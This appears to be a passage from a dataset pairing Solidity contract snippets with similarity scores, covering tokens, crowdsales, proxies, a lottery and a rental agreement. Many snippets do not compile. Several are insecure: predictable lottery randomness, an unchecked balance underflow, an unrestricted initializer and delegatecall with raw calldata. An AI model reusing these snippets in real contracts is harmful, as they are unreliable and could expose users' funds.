        balances[receiver] += amount;
        Sent(msg.sender, receiver, amount);
    }
}",0.6537187709167732,"contract StandToken is ERC20 {



    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balances[msg.sender] >= _value);

        require(_value > 0);

        require(balances[msg.sender] + _value >= balances[msg.sender]);

        

        balances[msg.sender] -= _value;

        balances[_to] += _value;



        emit Transfer(msg.sender, _to, _value);

    }



    function balanceOf(address _owner) public constant returns (uint256 balance) {

        return balances[_owner];

    }



    mapping (address => uint256) balances;

    uint256 public totalSupply;

}"
"contract TokenManager {

    function createNewToken(string name) external {
        
    }

    function buy(string name, uint amount) external {
        
    }

    function sell(string name, uint amount) external {
        
    }
}",0.6748096011273871,"contract ITokenExchange {

    function approve(ERC20 token, address spender, uint amount) external returns (bool);



    function exchange(ERC20 fromToken, uint amount) external;

}"
"contract Dummy {
  uint a = 0;
  function increment() {
    a = a + 1;
  }
}",0.6681103902029543,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract TrojanSecret {

uint memberCount;

string public name;
string public symbol;

mapping (string => address) Trojans;
mapping (string => string) secrets;
mapping (string => address[]) access;
mapping (string => uint) balance;
uint amount_for_unlock;



constructor() public{
        name   = ""Secrets""; 
        symbol = ""S"" ;
        amount_for_unlock = 1 ether;

}

function registerTrojan(string name) public returns(bool){
    if( Trojans[name] == address(0))  
    {
        memberCount ++;
        Trojans[name] = msg.sender;
        return True;
    } else {
        return false;
    }
}
function unregisterTrojan(string name) public {
    require( Trojans[name] != address(0));
    Trojans[name] = address(0);
    memberCount --;
}
function setSecret(string name,string message) public {
   require (Trojans[name] != address(0)&& Trojans[name] == msg.sender);
   secrets[name] = message;
}
function getSecret(string name) public view returns(string){
    require( Trojans[name] != address(0));
    bool flag = false;

    for(uint i = 0; i < access[name].length;i++)
    {
        if(access[name][i] == msg.sender){
            flag = true;
            break;

    }
     if(flag){
         return secrets[name];
     }
     return ""message is locked"";
}

function unlockMessage(string name ) public payable returns (bool) {
        require( Trojans[name] != address(0));
        if( msg.value == amount_for_unlock){

            balance[Trojans[name]] += msg.value;
            Trojans[name].transfer(msg.value);
            access[name].push(msg.sender);

            return true;
        }else{
            return false;
        }
    }",0.6166684255779469,"contract StandardToken is ERC20Protocol {
        using SafeMath for uint;

        
        modifier onlyPayloadSize(uint size) {
            require(msg.data.length >= size + 4);
            _;
        }

        function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) public returns (bool success) {
            
            
            
            
            if (balances[msg.sender] >= _value) {
                balances[msg.sender] -= _value;
                balances[_to] += _value;
                emit Transfer(msg.sender, _to, _value);
                return true;
            } else { return false; }
        }

        function transferFrom(address _from, address _to, uint _value) onlyPayloadSize(3 * 32) public returns (bool success) {
            
            
            if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value) {
                balances[_to] += _value;
                balances[_from] -= _value;
                allowed[_from][msg.sender] -= _value;
                emit Transfer(_from, _to, _value);
                return true;
            } else { return false; }
        }

        function balanceOf(address _owner) constant public returns (uint balance) {
            return balances[_owner];
        }

        function approve(address _spender, uint _value) onlyPayloadSize(2 * 32) public returns (bool success) {
            
            
            
            
            assert((_value == 0) || (allowed[msg.sender][_spender] == 0));

            allowed[msg.sender][_spender] = _value;
            emit Approval(msg.sender, _spender, _value);
            return true;
        }

        function allowance(address _owner, address _spender) constant public returns (uint remaining) {
        return allowed[_owner][_spender];
        }

        mapping (address => uint) balances;
        mapping (address => mapping (address => uint)) allowed;
    }"
"contract DataLocationHashC {


    struct DataUser {
    
    bool authorized; 
    bool reqhash; 
    string hashreq;
    uint reqquant;
    }


        string DescrptionHash;
        uint HashValue;



    address public owner;

    string public description;

    mapping( address => DataUser)  datauser;  




    constructor  (string memory _description) public {
        owner = msg.sender; 
        description = _description;
        
    }




    modifier ownerOnly() {
    require(msg.sender == owner);
    _; 
    
    }



    
    
    function authorizePerson(address _person) ownerOnly public {
        datauser[_person].authorized = true;
    
    }

    

    function addHash(uint _ActualHash) ownerOnly public {




            HashValue = _ActualHash;

    }

      function RequestHash() public constant returns(uint ){

        
        require(datauser[msg.sender].authorized);

        datauser[msg.sender].hashreq = description;
        datauser[msg.sender].reqhash = true;

       return (HashValue);


    }

    
    function end() ownerOnly public {
        selfdestruct(msg.sender);

        
    }


}",0.6180394547318391,"contract Store2 {



    

    uint16 constant internal NONE = 0;

    uint16 constant internal ADD = 1;

    uint16 constant internal REMOVE = 2;



    address public owner;

    uint public contentCount = 0;

    

    event LogStore(uint indexed version, address indexed sender, uint indexed timePage,

        uint16 eventType, string dataInfo);



    modifier onlyOwner {



        require(msg.sender == owner);

        _;

    }

    

    constructor() public {

        owner = msg.sender;

    }



    

    function () public {



        revert();

    }



    function kill() public onlyOwner {



        selfdestruct(owner);

    }



    function add(uint _version, string _dataInfo) public {



        contentCount++;

        emit LogStore(_version, msg.sender, block.timestamp / (1 days), ADD, _dataInfo);

    }



    function remove(uint _version, string _dataInfo) public {



        contentCount++;

        emit LogStore(_version, msg.sender, block.timestamp / (1 days), REMOVE, _dataInfo);

    }

}"
"contract Example is Owned {
    function doSomething() {
        if (address == <some address here) <statement>;
    }
}",0.6004473395263161,"contract Dai {

     function transferFrom(address src, address dst, uint wad) public returns (bool) {}

}"
"contract second {
    uint public x = 1;
    function make(){
        x = 2;
    }
    function(){
        x = 3;
    }
}",0.6288155578739797,"contract WETH {

    function deposit() public payable;

    function withdraw(uint) public;

}"
"contract AirDrop is Ownable {

  Token token;

  event TransferredToken(address indexed to, uint256 value);
  event FailedTransfer(address indexed to, uint256 value);

  modifier whenDropIsActive() {
    assert(isActive());

    _;
  }

  function AirDrop () {
      address _tokenAddr = 0x; 
      token = Token(_tokenAddr);
  }

  function isActive() constant returns (bool) {
    return (
        tokensAvailable() > 0 
    );
  }
  
  function sendTokens(address[] dests, uint256[] values) whenDropIsActive onlyOwner external {
    uint256 i = 0;
    while (i < dests.length) {
        uint256 toSend = values[i] * 10**18;
        sendInternally(dests[i] , toSend, values[i]);
        i++;
    }
  }

  
  function sendTokensSingleValue(address[] dests, uint256 value) whenDropIsActive onlyOwner external {
    uint256 i = 0;
    uint256 toSend = value * 10**18;
    while (i < dests.length) {
        sendInternally(dests[i] , toSend, value);
        i++;
    }
  }  

  function sendInternally(address recipient, uint256 tokensToSend, uint256 valueToPresent) internal {
    if(recipient == address(0)) return;

    if(tokensAvailable() >= tokensToSend) {
      token.transfer(recipient, tokensToSend);
      TransferredToken(recipient, valueToPresent);
    } else {
      FailedTransfer(recipient, valueToPresent); 
    }
  }   


  function tokensAvailable() constant returns (uint256) {
    return token.balanceOf(this);
  }

  function destroy() onlyOwner {
    uint256 balance = tokensAvailable();
    require (balance > 0);
    token.transfer(owner, balance);
    selfdestruct(owner);
  }
}",0.6488802711843553,"contract Crowdsale is Ownable {

  using SafeMath for uint256;



  ERC20 public token;



  

  uint256 public price;



  

  uint256 public weiRaised;



  

  event TokenPurchase(

    address indexed beneficiary,

    uint256 value,

    uint256 amount

  );



  bool public isFinalized = false;



  event Finalized();



  

  constructor(ERC20 _token, uint256 _price) public {

    require(_token != address(0));

    require(_price > 0);

    token = _token;

    price = _price;

  }



  

  function () external payable {

    require(!isFinalized);



    address beneficiary = msg.sender;

    uint256 weiAmount = msg.value;



    require(beneficiary != address(0));

    require(weiAmount != 0);



    uint256 tokens = weiAmount.div(price);

    uint256 selfBalance = balance();

    require(tokens > 0);

    require(tokens <= selfBalance);



    

    token.transfer(beneficiary, tokens);



    emit TokenPurchase(

      beneficiary,

      weiAmount,

      tokens

    );



    

    owner.transfer(msg.value);



    

    weiRaised = weiRaised.add(weiAmount);

  }





  

  function balance() public view returns (uint256) {

    address self = address(this);

    uint256 selfBalance = token.balanceOf(self);

    return selfBalance;

  }



  

  function setPrice(uint256 _price) onlyOwner public {

    require(_price > 0);

    price = _price;

  }



  

  function finalize() onlyOwner public {

    require(!isFinalized);



    transferBallance();



    emit Finalized();

    isFinalized = true;

  }



  

  function transferBallance() onlyOwner public {

    uint256 selfBalance = balance();

    token.transfer(msg.sender, selfBalance);

  }

}"
"contract VectorTest {

   
   function VectorTest() public {
      
   }

   
   function addScalar(int[] self, int a) public pure returns (int[] s) {
      for (uint i = 0; i < self.length; i++)
         s[i] = self[i] + a;
  }

   
   function addVector(int[] self, int[] melf) public pure returns (int[] s) {
      for (uint i = 0; i < self.length; i++)
         s[i] = self[i] + melf[i];
   }

}",0.6220808919164241,"contract GetTest{

    uint a = 1;

    string b = ""b"";

    address c;

    constructor() public {

        c = msg.sender;

    }

    function getOne() public constant returns(uint) {

        return a;

    }

    function getTwo() public constant returns(uint, string){

        return (a, b);

    }

    function getThree() public constant returns (uint, string, address){

        return (a, b, c);

    }

}"
"contract Shell is CoreAPI{

      CoreAPI core;
      address creator;

      function Shell () {
          creator = msg.sender;
      }

      function upgrade(address _core){
          if (msg.sender != creator) {
              revert();
          }
          core = CoreAPI(_core);
      }

      function getBalance() constant returns (uint response){
          address dest = core;
          bytes4 calldata = bytes4(sha3(""getBalance()""));
          assembly {
               let status := delegatecall(gas, dest, add(calldata, 0x20), mload(calldata), 0, 32)
               response := mload(0)
          }
      }

  }",0.6215157410176219,"contract Dispatcher is Upgradeable {
    
    constructor (address target) public {
        replace(target);
    }
    
    function initialize() public {
        
        revert();
    }

    function() public {
        uint len;
        address target;
        bytes4 sig;
        assembly { sig := calldataload(0) }
        len = _sizes[sig];
        target = _dest;
        
        bool ret;
        assembly {
            
            calldatacopy(0x0, 0x0, calldatasize)
            ret:=delegatecall(sub(gas, 10000), target, 0x0, calldatasize, 0, len)
            return(0, len)
        }
        if (!ret) revert();
    }
}"
"contract D {
  uint public n;
  address public sender;

  function callSetN(address _e, uint _n) public {
    _e.call(bytes4(keccak256(""setN(uint256)"")), _n); 
  }

  function callcodeSetN(address _e, uint _n) public {
    _e.callcode(bytes4(keccak256(""setN(uint256)"")), _n); 
  }

  function delegatecallSetN(address _e, uint _n) public {
    _e.delegatecall(bytes4(keccak256(""setN(uint256)"")), _n); 
  }
}",0.626593109912458,"contract PoSTokenStandard {
    uint256 public stakeStartTime;
    uint256 public stakeMinAge;
    uint256 public stakeMaxAge;
    function mine() public  returns (bool);
    function coinAge(address who) public  returns (uint256);
    function annualInterest() public  returns (uint256);
    event Mine(address indexed _address, uint _reward);
}"
"contract E {
  uint public n;
  address public sender;

  function setN(uint _n) public {
    n = _n;
    sender = msg.sender;
    
    

    
  }
}",0.6495103118059655,"contract TestToken {
    
    mapping (address => uint) public balanceOf;
    
    function () public payable {
        
        balanceOf[msg.sender] = msg.value;
        
    }
    
}"
"contract Rental {
    struct PaidRent {
        unit id;
        unit value;
    }
    PaidRent[] public paidrents;

    unit public createdTimestamp;
    unit public rent;
    unit public security_deposit;
    string public house;
    address public owner;
    address public tenant;

    enum state {Created, Started, Terminated}
    State public state;
    function Rental(unit _rent, unit _security_deposit, string _house, address _owner, address _tenant) {
        createdTimestamp = block.timestamp;
        rent = _rent;
        security_deposit = _security_deposit;
        house = _house;
        owner = _owner;
        tenant = _tenant;
    }
    modifier require(bool _condition) {
        if(!_condition) throw;
        _;
    }
    modifier LandlordOnly() {
        if(msg.sender != landlord) throw;
        _;
    }
    modifier TenantOnly() {
        if(msg.sender != tenant) throw;
        _;
    }
    modifier inState(State _state){
        if(_state != state) throw;
        _;
    }

    function getPaidRents() internal returns (PaidRent[]) {
        return paidrents;
    }

    function getHouse() constant returns (String) {
        return house;
    }
    function getLandlord() constant returns (address) {
        return landlord;
    }
    function getTenant() constant returns (address) {
        return tenant;
    }
    function getRent() constant returns (unit) {
        return rent;
    }
    function getDeposit() constant returns (unit) {
        return security_deposit;
    }
    function getContractCreated() constant returns (unit) {
        return createdTimestamp;
    }
    function getContractAddress() constant returns (address) {
        return this;
    }
    function getState() returns (State) {
        return state;
    }
    function CollectEth() payable  {}

    function payRent() TenantOnly inState(State.started) require(msg.value == rent) {
        landlord.transfer(msg.value);
        paidrents.push(PaidRent({
            id : paidrents.length + 1,
            value : msg.value
        }));
    }

    function terminateContract(address deposit_to) inState(State.started) require(this.balance == security_deposit) {
        deposit_to.transfer(security_deposit);
        state = State.Terminated;
    }



}",0.6088825712584989,"contract DETToken is ERC20 {

  using SafeMath for uint256;



  mapping (address => uint256) private balances;

  mapping (address => mapping (address => uint256)) private allowed;



  uint256 private totalSupply_ = 98000000 * (10 ** 18);

  string private constant name_ = 'DETToken';                                 

  string private constant symbol_ = 'DET';                                         

  uint8 private constant decimals_ = 18;                                          

  



  constructor () public {

    balances[msg.sender] = totalSupply_;

    emit Transfer(address(0), msg.sender, totalSupply_);

  }



  

  function totalSupply() public view returns (uint256) {

    return totalSupply_;

  }

  

   

  function name() public view returns (string) {

    return name_;

  }



  

  function symbol() public view returns (string) {

    return symbol_;

  }



  

  function decimals() public view returns (uint8) {

    return decimals_;

  }



  

  function balanceOf(address _owner) public view returns (uint256) {

    return balances[_owner];

  }



  

  function allowance(

    address _owner,

    address _spender

   )

    public

    view

    returns (uint256)

  {

    return allowed[_owner][_spender];

  }



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_value <= balances[msg.sender]);

    require(_to != address(0));



    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function approve(address _spender, uint256 _value) public returns (bool) {

    require(_spender != address(0));

	

    allowed[msg.sender][_spender] = _value;

    emit Approval(msg.sender, _spender, _value);

    return true;

  }



  

  function transferFrom(

    address _from,

    address _to,

    uint256 _value

  )

    public

    returns (bool)

  {

    require(_value <= balances[_from]);

    require(_value <= allowed[_from][msg.sender]);

    require(_to != address(0));



    balances[_from] = balances[_from].sub(_value);

    balances[_to] = balances[_to].add(_value);

    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

    emit Transfer(_from, _to, _value);

    return true;

  }  

}"
"contract DappToken {
  
  
  
  uint256 public totalSupply;

  function DappToken () public {
    totalSupply = 10000000;
  }
}",0.6164447597809101,"contract ERC721Enumerable is ERC721Basic {

    function totalSupply() public view returns (uint256);

}"
"contract tradefin {

    uint public prodcode;
    address public seller;
    address public buyer;
    uint public price;
    uint public units;
    address public port;
    address public customs;
    address public delivery;
    string public portcheck;
    string public customscheck;
    string public deliverycheck;
    string public msg1;


    function initiate(uint code, address vendor, address applicant, 
        uint amount, uint quantity, address p, address c, address d) {
        prodcode = code;
        seller = vendor;
        buyer = applicant;
        price = amount;
        units = quantity;
        port = p;
        customs = c;
        delivery = d;
    }

    function review() constant returns (uint retval) {
        return uint(prodcode);
    }

    function finall() constant returns (string retval) {
        return string(deliverycheck);
    }    

    function approve() constant returns (string retval) {
        if (msg.sender == port) {
            portcheck = ""signed"";
        }

        if (msg.sender == customs) {
            if (portcheck == ""signed"")             
                customscheck = ""signed"";
            else 
                msg1 = ""Port yet to sign"";
            return msg1;
        }

        if (msg.sender == delivery) {
            if (customscheck == ""signed"")
                deliverycheck = ""signed"";
            else            
                msg1 = ""Custom yet to sign"";
            return msg1;            
        }
    }    
}",0.6371247711436676,"contract ERC20Token {
    uint8   public decimals = 18;
    string  public name;
    string  public symbol;
    uint256 public totalSupply;

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    event  Approval(address indexed _owner, address indexed _spender, uint _value);
    event  Transfer(address indexed _from, address indexed _to, uint _value);

    constructor(
        string memory _name,
        string memory _symbol
    ) public {
        name = _name;
        symbol = _symbol;
    }

    function approve(address guy, uint256 wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint256 wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint256 wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad, ""INSUFFICIENT_FUNDS"");

        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
            require(allowance[src][msg.sender] >= wad, ""NOT_ALLOWED"");
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}"
"contract greeter is mortal {
    
    string greeting;

    
    function greeter(string _greeting) public {
        greeting = _greeting;
    }

    
    function greet() constant returns (string) {
        return greeting;
    }
    
    function setgreeting(string _greeting)  {
        greeting = _greeting;
    }
    
    function owned() constant returns (address) {
        return owner;
    }
}",0.6032673545926663,"contract ERC223 {

  uint public totalSupply;

  function balanceOf(address who) public constant returns (uint);

  function totalSupply()public constant returns (uint256 _supply);

  function name() public constant returns (string _name);

  function symbol()public constant returns (string _symbol);

}"
"contract A {

    address _sub = address(B);

    function write(uint256 _a) public returns (bool, bytes memory) {
        (bool x, bytes memory y) = _sub.call(msg.data);
        return (x, y);
    }

    function read(uint256 _b) public view returns (bool, bytes memory) {
        (bool x, bytes memory y) = _sub.staticcall(msg.data);
        return (x, y);
    }
}",0.6700095694462561,"contract ERC827 {

  function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);
  function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);
  function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);

}"
"contract SKYLotto {

  uint256 private secretNumber;
  uint256 public releasedNumber;
  uint256 public time;

    function randomGen() public {
        secretNumber = uint(keccak256(abi.encodePacked(now, msg.sender))) % 10;
        time = now + 30 seconds;
    }    

    function revealNumber() public {
      enter code here  require(now > time);
        releasedNumber = secretNumber;
        randomGen();
    }
}",0.6241245392426884,"contract SeeYouAtEthcon2020 {

    address public winner;

    uint256 public timeLock;

    

    constructor() public {

        timeLock = uint256(0) - 1;

    }

    

    function () payable external {

        require(msg.value >= 0.1 ether);

        timeLock = now + 6 hours;

        winner = msg.sender;

    }

    

    function claim() public {

        require(msg.sender == winner);

        require(now >= timeLock);

        msg.sender.transfer(address(this).balance);

    }

}"
"contract A {

    address _sub = address(B);

    function write(uint256 _a) public returns (bool, bytes memory) {
        (bool x, bytes memory y) = _sub.delegatecall(msg.data);
        return (x, y);
    }

    function read(uint256 _b) public returns (bool, bytes memory) {
        (bool x, bytes memory y) = _sub.delegatecall(msg.data);
        return (x, y);
    }
}",0.6629073660940421,"contract ERC827 {

  function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);
  function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);
  function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);

}"
"contract B {
  A a;
  constructor(address a_address) { a = I_A(a) };

  function exb(bytes32 _structaddr){
    
    a.myStructs(_structaddr); 
  }
}",0.6047083326092898,"contract InstaKyber is Trade {



    constructor(address rAddr) public {

        addressRegistry = rAddr;

    }



    function () public payable {}



}"
"contract Second {
  address public sender;

  function Second() {
    sender = msg.sender;
  }
}",0.6635462264787444,"contract IOwned {
    function owner() public constant returns (address) { owner; }
}"
"contract Tester {
    function getBytes() returns (bytes32) {
        return bytes32(0x1);
    }
}",0.6491794826201354,"contract Medianizer {

    function read() public view returns (bytes32);

}"
"contract SecondTransfer {

 function sendEtherCall(address contractaddr,address user,uint value) returns (bool success) {
      Transfer transfer=Transfer(contractaddr);
      return transfer.sendEther(user,value);
}
function sendAddressToAddressCall(address contractaddr,address fromuser,address touser) returns (bool success) {
      Transfer transfer=Transfer(contractaddr);
      return transfer.sendAddressToAddress(fromuser,touser);
}
function getBalanceCall(address contractaddr,address user) returns (uint _balance) {
      Transfer transfer=Transfer(contractaddr);
      return transfer.getBalance(user);
  }

 }",0.6235297285306481,"contract LimitedTransferToken is ERC20 {
  
  modifier canTransfer(address _sender, uint _value) {
   if (_value > transferableTokens(_sender, uint64(now))) throw;
   _;
  }

  
  function transfer(address _to, uint _value) canTransfer(msg.sender, _value) returns (bool) {
   return super.transfer(_to, _value);
  }

  
  function transferFrom(address _from, address _to, uint _value) canTransfer(_from, _value) returns (bool) {
   return super.transferFrom(_from, _to, _value);
  }

  
  function transferableTokens(address holder, uint64 time) constant public returns (uint256) {
    return balanceOf(holder);
  }
}"
"contract Crowdsale {

    

    function buyTokens(address beneficiary) public payable {
        require(beneficiary != 0x0);
        require(validPurchase());

        
        token.mint(beneficiary, tokens); 
        
  }
}",0.612100991067958,"contract Beneficiary is Ownable {

    address public beneficiary;

    function setBeneficiary(address _beneficiary) onlyOwner public {
        beneficiary = _beneficiary;
    }


}"
"contract MySmartContract {
    function approveDeposit(address tokenAddress) public {
        ERC20 token = ERC20(tokenAddress);
        token.approve(address(this), token.balanceOf(msg.sender));
    }

    function depositToken(address tokenAddress) public {
        ERC20 token = ERC20(tokenAddress);
        uint tokenAmount = token.balanceOf(msg.sender);
        token.transferFrom(msg.sender, address(this), tokenAmount);
    }
}",0.6665110917945388,"contract TokenVault {

    

    IERC20 public token;



    constructor(IERC20 _token) public {

        token = _token;

    }



    

    function fillUpAllowance() public {

        uint256 amount = token.balanceOf(this);

        require(amount > 0);



        token.approve(token, amount);

    }



    

    function approve(address _spender, uint256 _tokensAmount) public {

        require(msg.sender == address(token));



        token.approve(_spender, _tokensAmount);

    }

}"
"contract Listing {
    uint public assessedValue;
    uint public listPrice;
    string public description;
    string public location;
    address public seller;
    bool public sold;
    mapping(address => bool) public buyers;
    uint public buyersCount;

    modifier restricted() {
        require(msg.sender == seller);
        _;
    }

    constructor(uint propertyValue, uint salePrice, string memory propertyDetails, string memory propertyLocation, address owner) public {
        propertyValue = assessedValue;
        listPrice = salePrice;
        description = propertyDetails;
        location = propertyLocation;
        seller = owner;
        }

    function confirmSale(uint confirm) public restricted returns(bool) {
        if (confirm == 1) {
            sold = true;
            return sold;
        }
    }
}",0.6292835063678782,"contract VestarinToken is MintableToken {	
    
  string public constant name = ""Vestarin"";
   
  string public constant symbol = ""VST"";
    
  uint32 public constant decimals = 18;

  mapping (address => uint) public locked;

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(locked[msg.sender] < now);
    return super.transfer(_to, _value);
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(locked[_from] < now);
    return super.transferFrom(_from, _to, _value);
  }
  
  function lock(address addr, uint periodInDays) public {
    require(locked[addr] < now && (msg.sender == saleAgent || msg.sender == addr));
    locked[addr] = now + periodInDays * 1 days;
  }

}"
"contract UserA {

  address public owner;
  address public user;
  address public SCAddress; 

 function UserA(string _provider,address _user,address _scaddress) {
        owner = msg.sender;
        user = _user;
        SCAddress = _scaddress;
    }

  function setColor(string c) { 
    if (msg.sender == user) { 
             color = c;
        }
    }
",0.6517074684124509,"contract owned {

    address public owner;

    address public contractAddress;



    function owned() public{

        owner = msg.sender;

        contractAddress = this;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(address newOwner) public onlyOwner {

        owner = newOwner;

    }

}"
"contract User {
    address[] userList;
    function addUser (address a) returns (bool) {
        userList.push(a);
    }",0.6713077669494595,"contract Exchange {

  function balanceOf(address token, address user) public view returns (uint);

}"
"contract DataStore {

    struct Datum {
        uint8   id;
        bytes32 serialNum;
        string  name;
        uint256 createdAt;
    }

    mapping (address => Datum) private entityData; 

    function getName(address entity) public constant returns (string) {
        if (isAllowed(msg.sender) {
            return name;
        }
        else {
            return """";
        }
    } 
    ...
    ...
",0.6245468660704997,"contract ERC223 is ERC20 {



    function name() constant returns (string _name);

    function symbol() constant returns (string _symbol);

    function decimals() constant returns (uint8 _decimals);



    function transfer(address to, uint256 value, bytes data) returns (bool);



}"
"contract Tenno2 {


address Player;

string Warframe = ""Ember Prime"";
uint Rank = 1;
bool Potato = false;
uint HP = 150;
uint MP = 200;





constructor() public payable {
    Player = msg.sender;

}

event AbilityUsed(string ability);
event Restored(uint health, uint energy);
event RankChange(uint rank);



function getWarframe() public constant returns (string) { return Warframe; }

function getPotato() public constant returns (bool) { return Potato; }
function PotatoFrame() public { Potato = true; }

function getHP() public constant returns (uint) { return HP; }
function getMP() public constant returns (uint) { return MP; }

function getRank() public constant returns (uint) { return Rank; }
function getCapacity() public constant returns(uint) {
    if (Potato == true) {
        return Rank * 2;
    }
    else {
        return Rank;
    }
}

function First() public{
    if (MP >= 25) {
        MP -= 25;
    }
    emit AbilityUsed(""Fireball"");
}

function Second() public {
    if (MP >= 50) {
        MP -= 50;
    }
    emit AbilityUsed(""Accelerant"");
}

function Thirth() public {
    if (MP >= 75) {
        MP -= 75;
    }
    emit AbilityUsed(""Fireblast"");
}

function Fourth() public {
    if (MP >= 100) {
        MP -= 100;
    }
    emit AbilityUsed(""World on Fire"");
}

function Heal(uint amount) public returns (uint) {
    HP += amount;
    emit Restored(amount, 0);
    return HP;
}

function TakeDamage(uint amount) public returns (uint) {
    HP -= amount;
    return HP;
}

function Recharge(uint amount) public returns (uint) {
    MP += amount;
    emit Restored(0, amount);
    return MP;
}

function RankUp() public returns (uint) {
    if (Rank < 30) {
        Rank += 1;
    }
    emit RankChange(Rank);
    return Rank;
}

function ResetRank() public returns (uint) {
    if (Rank == 30) {
        Rank = 1;
    }
    emit RankChange(Rank);
    return Rank;
}
}",0.6085209474092086,"contract ITTInterface
{

    using LibCLLu for LibCLLu.CLL;



    string constant VERSION = ""ITT 0.3.6\nERC20 0.2.3-o0ragman0o\nMath 0.0.1\nBase 0.1.1\n"";
    uint constant HEAD = 0;
    uint constant MINNUM = uint(1);
    
    uint constant MAXNUM = 2**128;
    uint constant MINPRICE = uint(1);
    uint constant NEG = uint(-1); 
    bool constant PREV = false;
    bool constant NEXT = true;
    bool constant BID = false;
    bool constant ASK = true;

    
    uint constant MINGAS = 100000;

    
    
    
    struct TradeMessage {
        bool make;
        bool side;
        uint price;
        uint tradeAmount;
        uint balance;
        uint etherBalance;
    }



    
    bool public trading;

    
    mapping (address => uint) etherBalance;

    
    
    
    
    mapping (uint => LibCLLu.CLL) orderFIFOs;
    
    
    
    
    mapping (bytes32 => uint) amounts;

    
    LibCLLu.CLL priceBook = orderFIFOs[0];




    
    event Ask (uint indexed price, uint amount, address indexed trader);

    
    event Bid (uint indexed price, uint amount, address indexed trader);

    
    event Sale (uint indexed price, uint amount, address indexed buyer, address indexed seller);

    
    event Trading(bool trading);



    
    function spread(bool _side) public constant returns(uint);
    
    
    
    
    function getAmount(uint _price, address _trader) 
        public constant returns(uint);

    
    
    function getPriceVolume(uint _price) public constant returns (uint);

    
    
    
    function getBook() public constant returns (uint[]);



    
    
    
    
    function buy (uint _bidPrice, uint _amount, bool _make)
        payable returns (bool);

    
    
    
    
    function sell (uint _askPrice, uint _amount, bool _make)
        external returns (bool);

    
    
    function withdraw(uint _ether)
        external returns (bool success_);

    
    
    function cancel(uint _price) 
        external returns (bool);

    
    
    function setTrading(bool _trading) 
        external returns (bool);
}"
"contract TransManager {
  

  
  address private creator;

  uint transCounter;

  
  struct metaData{
    uint id;
    address owner;
    string docType;
    string fileHash;
  }

  
  mapping (address => metaData[])  fileLogs;


  

  function regTransaction(string _docType, string _fileHash) public {
    transCounter++;
    var fileLog = metaData(transCounter, msg.sender, _docType, _fileHash );

    fileLogs[msg.sender].push(fileLog);

  }

  function getTransactions() public returns (uint []){
    var temp = fileLogs[msg.sender];


    uint[] memory ids = new uint[](transCounter);


    for (uint i=0; i<= transCounter; i++){
        ids[i]=temp[i].id;
    }

    return ids;
  }



  
    function TransManager() {
        creator = msg.sender;
    }

  
   function kill() {
       if (msg.sender == creator) {
           selfdestruct(creator);
       }
   }

}",0.6091568686017104,"contract System {

	using SafeMath for uint256;

	

	address owner;

	

	



	

	modifier onlyOwner() {

		if (msg.sender != owner) {

			error('System: onlyOwner function called by user that is not owner');

		} else {

			_;

		}

	}



	

	

	

	function error(string _error) internal {

		revert(_error);

		

		

		

	}



	

	function whoAmI() public constant returns (address) {

		return msg.sender;

	}

	

	

	function timestamp() public constant returns (uint256) {

		return block.timestamp;

	}

	

	

	function contractBalance() public constant returns (uint256) {

		return address(this).balance;

	}

	

	

	constructor() public {

		

		owner = msg.sender;

		

		

		if(owner == 0x0) error('System constructor: Owner address is 0x0'); 

	}

	

	



	

	event Error(string _error);



	

	event DebugUint256(uint256 _data);



}"
"contract Master {
    mapping(address => uint) public balances;
    address public implementation;

    function setBalance(address _address, uint _balance) public {
        balances[_address] = _balance;
    }

    function getBalance(address _balance) public view returns (uint) {
        return balances[_balance];
    }


}",0.6876269675517914,"contract GemLike2 {
    function decimals() public view returns (uint);
    function transfer(address,uint) public;
    function transferFrom(address,address,uint) public;
    function balanceOf(address) public view returns (uint);
    function allowance(address,address) public view returns (uint);
}"
"contract dCoders {
    
    
    address public owner;
    uint public regFee;

    mapping (address => uint) public balance; 

    constructor() public {
        owner = msg.sender;
        regFee = 2 ether;
    }

    event reg(address indexed _from);

    
    function register() payable public {
        

        balance[msg.sender] -= regFee;
        balance[address(this)] += regFee;   

        emit reg(msg.sender);
    }

    

    
}",0.6739538491583453,"contract Ownable {
  address public owner;

  event NewOwner (address indexed owner);

  constructor () public {
    owner = msg.sender;
  }

  modifier onlyOwner () {
    if (owner != msg.sender) revert();
    _;
  }

  function setOwner (address candidate) public onlyOwner {
    if (candidate == address(0)) revert();
    owner = candidate;
    emit NewOwner(owner);
  }
}"
"contract C {
    address a;
    constructor(address _a) public {
        a = _a;
    }

    function get() external view returns (address) {
        return a;
    }
}",0.6931409301957414,"contract Owner {

    

    function owner() public view returns (address);

    

    

    function isValidOwner(address _address) public view returns(bool);



}"
"contract Testing {
    using GetName for address;

    mapping (address => string) public record;

    function recordName(address addr) public {
        record[addr] = addr.getNameOrEmpty();
    }
}",0.6174921761527028,"contract Token {
    mapping (address => uint256) public balanceOf;
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
}"
"contract OrcBase is InterfaceOrcs {
    struct Orc {
        uint health;
        uint strenth;
